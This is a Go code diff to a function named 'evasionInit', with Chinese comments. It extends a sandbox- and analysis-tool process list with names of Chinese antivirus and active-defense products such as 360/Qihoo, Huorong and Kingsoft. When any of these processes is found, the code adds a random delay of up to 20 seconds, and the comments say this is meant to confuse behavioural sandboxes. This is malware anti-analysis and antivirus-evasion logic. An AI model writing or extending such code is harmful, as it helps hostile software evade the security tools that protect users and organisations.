@@ -28,13 +28,17 @@ func evasionInit() {
 		}
 	}
 
-	// 2. 沙箱/虚拟化/分析工具进程特征
+	// 2. 沙箱/虚拟化/分析工具进程特征（含常见国内杀软主动防御进程）
 	suspects := []string{
 		"vboxservice", "vboxtray", "vbox", "vmwaretray", "vmwareuser",
 		"vmacthlp", "vmsrvc", "vmtoolsd", "sandboxie", "sbiesvc",
 		"sbiectrl", "procmon", "procmon64", "tcpview", "autoruns",
 		"wireshark", "fiddler", "charles", "burpsuite", "ollydbg",
 		"x64dbg", "windbg", "ida64", "ida",
+		// 主动防御/安全软件特征进程（命中即延迟，干扰行为沙箱判定）
+		"qihoo", "qhsafetray", "qhactivedefense", "zhudongfangyu",
+		"360tray", "360safe", "360sd", "360se", "360zip", "huorong",
+		"hipsdaemon", "sysdiag", "wsctrl", "kxescore", "kxetray",
 	}
 	if snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0); err == nil {
 		defer windows.CloseHandle(snap)
@@ -64,7 +68,10 @@ resourceCheck:
 		}
 	}
 
+	// 4. 随机运行延迟：0~20s，打乱自动化/行为沙箱对"启动即连/即行为"的判定节奏。
+	//    仅当检测到上述分析/安全特征时才叠加随机延迟，正常主机不额外延时。
 	if delay > 0 {
+		delay += time.Duration(time.Now().UnixNano()%20000) * time.Millisecond
 		time.Sleep(delay)
 	}
 }
